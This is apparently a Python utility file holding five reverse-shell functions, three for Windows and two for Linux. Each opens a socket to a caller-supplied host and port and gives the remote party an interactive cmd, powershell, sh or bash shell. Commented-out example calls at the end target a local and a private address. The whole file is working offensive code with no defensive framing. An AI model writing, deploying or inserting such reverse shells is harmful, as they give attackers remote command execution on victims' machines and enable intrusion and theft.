def win1(ip, port=8888):
    import socket
    import subprocess
    import os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        output = '[+] 连接成功!\n'
        response = output + f'\n{os.getcwd()} > '
        s.send(response.encode('utf-8'))
        while True:
            command = s.recv(1024).decode('utf-8').strip()
            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)
            response = output + f'\n\n{os.getcwd()} > '
            s.send(response.encode('utf-8'))
    except Exception as e:
        s.send(f'[!] Connection error: {str(e)}\n'.encode())
    finally:
        s.close()


def win2(ip, port=8888, c='cmd'):
    import socket
    import subprocess
    import threading

    def s2p(s, p):
        try:
            while 1:
                d = s.recv(1024)
                if not d:
                    break
                p.stdin.write(d)
                p.stdin.flush()
        except:
            pass
        finally:
            p.stdin.close()

    def p2s(s, p):
        try:
            while 1:
                l = p.stdout.readline()
                if not l:
                    break
                try:
                    d = l.decode('gbk', errors='ignore')
                except:
                    d = l.decode('utf-8', errors='ignore')
                s.sendall(d.encode('utf-8'))
        except:
            pass
        finally:
            s.close()
    s = socket.socket()
    s.connect((ip, port))
    p = subprocess.Popen([c], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    threading.Thread(target=s2p, args=(s, p), daemon=True).start()
    threading.Thread(target=p2s, args=(s, p), daemon=True).start()
    try:
        p.wait()
    except:
        pass
    finally:
        s.close()


def win3(ip, port=8888, c='cmd'):
    import os
    import socket
    import subprocess
    import threading

    def s2p(s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(s, p):
        while True:
            s.send(p.stdout.read(1))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    p = subprocess.Popen([c], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[s, p])
    s2p_thread.daemon = True
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[s, p])
    p2s_thread.daemon = True
    p2s_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()


def linux1(ip, port=8888, c='sh'):
    import socket
    import os
    import pty
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn(c)


def linux2(ip, port=8888, c='sh'):
    import socket
    import subprocess
    import os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call([c, "-i"])




# win1('127.0.0.1', 8888)
# win2('127.0.0.1', 8888,'powershell')
# win3('127.0.0.1', 8888)
# lin1('192.168.111.11', c='bash')
# lin2('192.168.111.11', c='sh')
